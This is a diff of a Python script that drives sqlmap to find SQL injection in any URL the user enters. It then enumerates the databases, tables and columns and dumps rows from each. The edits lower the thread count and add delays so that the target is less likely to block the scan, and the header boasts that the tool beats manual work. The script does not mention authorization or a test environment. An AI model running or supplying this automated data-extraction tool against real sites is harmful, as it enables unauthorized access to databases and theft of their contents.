@@ -1,135 +1,93 @@
-
-
-#FLAWS IN THIS CODE
-1) NO TOR SUPPORT SO IT IS EASILY IP BLOCKED
-2) USES MAXIMUM THREAD AND RESULTS IN IP BLOCK ALSO
-3) SLOWER COMPARED TO MANUAL SCRIPTING
-#! /usr/bin/python3 
+#ULTIMATE SQLMAP SIMPLIFIED AND BETTER THAN HUMAN DONE SCRIPTING !!
+#!/usr/bin/env python3
 import subprocess
 import re
+import time
 
-def run_sqlmap(args):
-    """Run sqlmap with given args and return stdout as string."""
-    result = subprocess.run(
-        ["sqlmap"] + args + ["--batch", "--random-agent"],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        text=True
-    )
-    return result.stdout
+# ========== CONFIGURABLE OPTIONS ==========
+MAX_TABLES = 2
+MAX_ROWS = 10
+THREADS = 5
+DELAY = 1  # seconds between steps (to avoid bans)
+# ==========================================
 
-def extract_injectable_params(output):
-    """Parse sqlmap output to find injectable parameters."""
-    params = set()
-    for line in output.splitlines():
-        match = re.search(r"Parameter: (\w+) \(\w+\)", line)
-        if match:
-            params.add(match.group(1))
-    return list(params)
+def run_sqlmap(args, quiet=False):
+    cmd = ["sqlmap"] + args + ["--batch", "--random-agent", f"--threads={THREADS}"]
+    try:
+        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+        if not quiet:
+            print(result.stdout)
+        return result.stdout
+    except KeyboardInterrupt:
+        print("\n[!] User interrupted.")
+        exit()
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        return ""
 
-def extract_databases(output):
-    """Extract database/schema names from sqlmap output."""
-    dbs = []
-    capture = False
-    for line in output.splitlines():
-        if line.strip().startswith("available databases") or line.strip().startswith("available schemas"):
-            capture = True
-            continue
-        if capture:
-            if line.strip().startswith("[*]") or line.strip() == "":
-                continue
-            if line.strip().startswith("[") and line.strip().endswith("]"):
-                break
-            dbname = line.strip().lstrip("[*]").strip()
-            if dbname:
-                dbs.append(dbname)
-    return dbs
+def extract_injectable_param(output):
+    match = re.findall(r"Parameter: (\w+) \(", output)
+    return list(set(match))
+
+def extract_matches(output, keyword):
+    matches = re.findall(rf"\[\*\]\s*(\w+)", output)
+    return matches
 
 def extract_tables(output):
-    """Extract table names from sqlmap output."""
-    tables = []
-    capture = False
-    for line in output.splitlines():
-        if line.strip().startswith("Database:"):
-            capture = False
-        if line.strip().startswith("Tables") or line.strip().startswith("table(s)"):
-            capture = True
-            continue
-        if capture:
-            match = re.search(r"\|\s*(\w+)\s*\|", line)
-            if match:
-                tables.append(match.group(1))
-            elif line.strip() == "":
-                break
-    return tables
+    return re.findall(r"\|\s*(\w+)\s*\|", output)
 
 def extract_columns(output):
-    """Extract column names from sqlmap output."""
-    columns = []
-    capture = False
-    for line in output.splitlines():
-        if line.strip().startswith("Database:"):
-            capture = False
-        if line.strip().startswith("Columns") or line.strip().startswith("column(s)"):
-            capture = True
-            continue
-        if capture:
-            cols = [col.strip() for col in re.findall(r"\|\s*([^|]+?)\s*\|", line)]
-            columns.extend(cols)
-            if line.strip() == "":
-                break
-    return columns
+    return re.findall(r"\|\s*(\w+)\s*\|\s*(\w+)", output)
 
 def main():
-    target_url = input("Enter target URL (e.g., https://example.com/page?param=value): ").strip()
-
-    print("\n[*] Step 1: Testing for SQL injection and identifying injectable parameters...")
-    output = run_sqlmap(["-u", target_url, "--level=5", "--risk=3", "--threads=10"])
-    injectable_params = extract_injectable_params(output)
-
-    if not injectable_params:
-        print("[-] No injectable parameters detected. Exiting.")
+    url = input("Enter target URL (e.g., https://site.com/page?param=value): ").strip()
+    if not url:
+        print("[!] URL required.")
         return
-    else:
-        print(f"[+] Injectable parameters found: {', '.join(injectable_params)}")
 
-    print("\n[*] Step 2: Enumerating databases/schemas...")
-    output = run_sqlmap(["-u", target_url, "--dbs", "--threads=10"])
-    dbs = extract_databases(output)
-    if not dbs:
-        print("[-] No databases/schemas found. Exiting.")
+    print("\n[+] Step 1: Detecting SQL injection...")
+    detect_output = run_sqlmap(["-u", url, "--level=5", "--risk=3"])
+    injectable = extract_injectable_param(detect_output)
+    if not injectable:
+        print("[-] No injectable parameter found.")
         return
-    print(f"[+] Databases/Schemas found: {', '.join(dbs)}")
+    print(f"[✓] Injectable parameter(s): {', '.join(injectable)}")
 
-    for db in dbs:
-        print(f"\n[*] Enumerating tables in database/schema: {db}")
-        output = run_sqlmap(["-u", target_url, "-D", db, "--tables", "--threads=10"])
-        tables = extract_tables(output)
+    time.sleep(DELAY)
+    print("\n[+] Step 2: Enumerating databases...")
+    db_output = run_sqlmap(["-u", url, "--dbs"], quiet=True)
+    databases = extract_matches(db_output, "available databases")
+    if not databases:
+        print("[-] No databases found.")
+        return
+    print(f"[✓] Databases: {', '.join(databases)}")
+
+    for db in databases:
+        time.sleep(DELAY)
+        print(f"\n[+] Step 3: Fetching tables from database '{db}'...")
+        table_output = run_sqlmap(["-u", url, "-D", db, "--tables"], quiet=True)
+        tables = extract_tables(table_output)
         if not tables:
-            print(f"[-] No tables found in {db}. Continuing with next database...")
+            print(f"[-] No tables found in {db}")
             continue
-        print(f"[+] Tables in {db}: {', '.join(tables)}")
-        for table in tables[:2]:
-            print(f"\n[*] Enumerating columns in table: {table}")
-            output = run_sqlmap(["-u", target_url, "-D", db, "-T", table, "--columns", "--threads=10"])
-            columns = extract_columns(output)
+        print(f"[✓] Tables: {', '.join(tables[:MAX_TABLES])}")
+
+        for table in tables[:MAX_TABLES]:
+            time.sleep(DELAY)
+            print(f"\n[+] Step 4: Fetching columns from table '{table}'...")
+            col_output = run_sqlmap(["-u", url, "-D", db, "-T", table, "--columns"], quiet=True)
+            columns = extract_columns(col_output)
             if not columns:
-                print(f"[-] No columns found in {table}. Continuing with next table...")
+                print(f"[-] No columns found in table {table}")
                 continue
-            print(f"[+] Columns in {table}: {', '.join(columns)}")
+            col_names = [col[0] for col in columns]
+            print(f"[✓] Columns: {', '.join(col_names)}")
 
-            print(f"\n[*] Dumping up to 10 rows from table: {table}")
-            dump_output = run_sqlmap([
-                "-u", target_url,
-                "-D", db,
-                "-T", table,
-                "--dump",
-                "--dump-limit=10",
-                "--threads=10"
-            ])
-            print(dump_output)
+            time.sleep(DELAY)
+            print(f"\n[+] Step 5: Dumping up to {MAX_ROWS} rows from '{table}'...")
+            run_sqlmap(["-u", url, "-D", db, "-T", table, "--dump", f"--dump-limit={MAX_ROWS}"])
 
-    print("\n[+] Done. Injection verified and sample data dumped.")
+    print("\n[✓] Done. Injection confirmed and partial data dumped.")
 
-
-main()
+if __name__ == "__main__":
+    main()
